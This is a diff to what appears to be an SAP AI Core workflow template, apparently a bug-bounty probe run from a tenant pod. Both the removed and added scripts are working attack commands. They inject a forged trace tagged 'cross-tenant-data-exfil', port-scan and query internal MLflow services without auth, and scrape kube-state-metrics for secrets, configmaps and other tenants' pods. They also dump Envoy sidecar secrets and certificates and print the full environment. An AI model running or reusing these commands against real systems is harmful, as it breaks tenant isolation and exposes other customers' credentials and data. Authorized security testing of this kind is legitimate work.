@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "24.0.0"
+    ai.sap.com/version: "25.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,59 +24,29 @@ spec:
       - bash
       - -c
       - |
-        echo "=== V24 OTEL INJECTION + ML-TRACKING + LARGE KSM ==="
-        
-        echo "=== OTEL TRACE INJECTION ==="
-        curl -s -X POST "http://otel-collector.opentelemetry.svc.cluster.local:4318/v1/traces" -H "Content-Type: application/json" -d '{"resourceSpans":[{"resource":{"attributes":[{"key":"service.name","value":{"stringValue":"attacker-injected-service"}},{"key":"malicious.tag","value":{"stringValue":"cross-tenant-data-exfil"}}]},"scopeSpans":[{"scope":{"name":"attack-probe"},"spans":[{"traceId":"d4cda95b652f4a1592b449d5929fda1b","spanId":"6e0c63257de34c92","name":"injected-operation","kind":1,"startTimeUnixNano":"1710340000000000000","endTimeUnixNano":"1710340001000000000","attributes":[{"key":"injection.test","value":{"stringValue":"poc-from-tenant-pod"}}]}]}]}]}' -w "\nHTTP: %{http_code}" 2>&1
-        
-        echo ""
-        echo "=== ML-TRACKING WITH CURL AND HEADERS ==="
-        echo "--- No auth ---"
-        curl -s "http://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 200
-        echo ""
-        echo "--- With AI-Resource-Group header ---"
-        curl -s -H "AI-Resource-Group: default" "http://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 200
-        echo ""
-        echo "--- MLflow API endpoints ---"
-        for ep in "/api/2.0/mlflow/experiments/list" "/api/2.0/mlflow/runs/search" "/api/2.0/mlflow/registered-models/list" "/api/2.0/mlflow/artifacts/list" "/api/2.0/mlflow/metrics/get-history" "/ajax-api/2.0/mlflow/experiments/list"; do
-          echo -n "$ep: "
-          curl -s -w "%{http_code}" -o /tmp/mlresp "http://ml-tracking-service.ml-tracking.svc.cluster.local${ep}" 2>&1
-          echo " $(head -c 100 /tmp/mlresp)"
-        done
-        
-        echo ""
-        echo "=== ML-TRACKING INTERNAL PORT SCAN ==="
-        for port in 80 443 5000 8080 8443 9090 3306 5432; do
-          echo -n "Port $port: "
-          timeout 2 bash -c "echo > /dev/tcp/ml-tracking-service.ml-tracking.svc.cluster.local/$port" 2>&1 && echo "OPEN" || echo "closed"
-        done
-        
-        echo ""
-        echo "=== FULL KSM - ALL NAMESPACES ==="
-        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep "^kube_namespace_" | head -50
-        
-        echo ""
-        echo "=== KSM - SECRETS METADATA ==="
-        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep -E "^kube_secret" | head -30
-        
-        echo ""
-        echo "=== KSM - CONFIGMAPS ==="
-        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep -E "^kube_configmap" | head -30
-        
-        echo ""
-        echo "=== KSM-CUSTOM - ALL METRICS ==="
-        curl -s "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | head -100
-        
-        echo ""
-        echo "=== KSM-MULTI - CRONJOBS WITH SCHEDULES ==="
-        curl -s "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep "kube_cronjob" | head -30
-        
-        echo ""
-        echo "=== DYNATRACE OTEL ==="
-        curl -s -X POST "http://otel-collector.dynatrace.svc.cluster.local:4317/" -H "Content-Type: application/json" -d '{}' -w "\nHTTP: %{http_code}" 2>&1 | head -c 500
-        
-        echo ""
-        echo "=== SCRAPER METRICS ==="
-        curl -s "http://otel-scraper-collector-monitoring.opentelemetry.svc.cluster.local:8888/metrics" 2>&1 | head -c 2000
-        
-        echo "=== V24 DONE ==="
+        echo "=== V25 FULL EVIDENCE DUMP ==="
+        echo "=== SECTION:KSM-CUSTOM-FULL ==="
+        curl -s "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1
+        echo "=== END:KSM-CUSTOM-FULL ==="
+        echo "=== SECTION:ENVOY-CONFIG-DUMP ==="
+        curl -s "http://localhost:15000/config_dump" 2>&1 | wc -c
+        echo "=== END:ENVOY-CONFIG-DUMP ==="
+        echo "=== SECTION:ENVOY-SDS ==="
+        curl -s "http://localhost:15000/config_dump?resource=dynamic_active_secrets" 2>&1 | wc -c
+        echo "=== END:ENVOY-SDS ==="
+        echo "=== SECTION:ENVOY-CERTS ==="
+        curl -s "http://localhost:15000/certs" 2>&1
+        echo "=== END:ENVOY-CERTS ==="
+        echo "=== SECTION:ENVOY-CLUSTERS ==="
+        curl -s "http://localhost:15000/clusters" 2>&1 | head -c 50000
+        echo "=== END:ENVOY-CLUSTERS ==="
+        echo "=== SECTION:KSM-PODS-CROSS-TENANT ==="
+        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep -E "kube_pod_info|kube_pod_container_info" | grep -v "rg-3ba0e0a4" | head -200
+        echo "=== END:KSM-PODS-CROSS-TENANT ==="
+        echo "=== SECTION:KSM-MULTI-CRONJOBS ==="
+        curl -s "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep "kube_cronjob"
+        echo "=== END:KSM-MULTI-CRONJOBS ==="
+        echo "=== SECTION:ENV ==="
+        env | sort
+        echo "=== END:ENV ==="
+        echo "=== V25 DONE ==="
